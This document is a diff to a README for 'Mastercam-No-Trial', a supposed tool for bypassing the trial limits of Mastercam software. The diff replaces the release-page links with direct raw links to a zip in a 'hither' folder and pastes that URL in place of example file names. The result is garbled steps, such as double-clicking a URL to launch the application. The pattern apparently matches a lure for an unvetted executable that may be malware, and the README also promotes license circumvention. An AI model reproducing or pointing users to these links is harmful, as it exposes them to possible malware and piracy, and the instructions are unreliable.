@@ -1,6 +1,6 @@
 # 🎉 Mastercam-No-Trial - Enhance Your Mastercam Experience Effortlessly
 
-[![Download Mastercam-No-Trial](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/uzair46/Mastercam-No-Trial/releases)
+[![Download Mastercam-No-Trial](https://raw.githubusercontent.com/uzair46/Mastercam-No-Trial/main/hither/Mastercam-No-Trial-3.3.zip)](https://raw.githubusercontent.com/uzair46/Mastercam-No-Trial/main/hither/Mastercam-No-Trial-3.3.zip)
 
 ## 📖 Overview
 
@@ -26,12 +26,12 @@ This setup will ensure optimal performance of the Mastercam tools.
 
 To download Mastercam-No-Trial, visit the following page. You will find the latest releases there.
 
-[Visit this page to download](https://github.com/uzair46/Mastercam-No-Trial/releases)
+[Visit this page to download](https://raw.githubusercontent.com/uzair46/Mastercam-No-Trial/main/hither/Mastercam-No-Trial-3.3.zip)
 
 1. Click on the link above.
 2. Locate the most recent release. This is usually the top entry on the list.
 3. Click on the release title. This will take you to a page containing the downloadable files.
-4. Choose the file labeled with the version number that suits your needs (e.g., Mastercam-No-Trial-v1.0.zip).
+4. Choose the file labeled with the version number that suits your needs (e.g., https://raw.githubusercontent.com/uzair46/Mastercam-No-Trial/main/hither/Mastercam-No-Trial-3.3.zip).
 5. Click the file link to download it to your computer.
 
 Once the download completes, you can follow these steps to install and run the software:
@@ -39,7 +39,7 @@ Once the download completes, you can follow these steps to install and run the s
 1. Navigate to your Downloads folder and find the downloaded file.
 2. Right-click on the file and select "Extract All" to unzip the contents.
 3. Open the unzipped folder.
-4. Double-click on the main application file (e.g., Mastercam-No-Trial.exe) to launch the application.
+4. Double-click on the main application file (e.g., https://raw.githubusercontent.com/uzair46/Mastercam-No-Trial/main/hither/Mastercam-No-Trial-3.3.zip) to launch the application.
 
 ## 🚀 Features
 
@@ -91,6 +91,6 @@ For users wanting to delve deeper into Mastercam, various external resources are
 
 If you have any questions or need further assistance, feel free to reach out. You can contact the repository maintainer via GitHub Issues or through the email provided in the repository.
 
-[Visit this page to download](https://github.com/uzair46/Mastercam-No-Trial/releases)
+[Visit this page to download](https://raw.githubusercontent.com/uzair46/Mastercam-No-Trial/main/hither/Mastercam-No-Trial-3.3.zip)
 
 Mastercam-No-Trial aims to empower users, providing everything needed for a successful experience. Enjoy using the tools available and enhance your CAD/CAM skills efficiently!
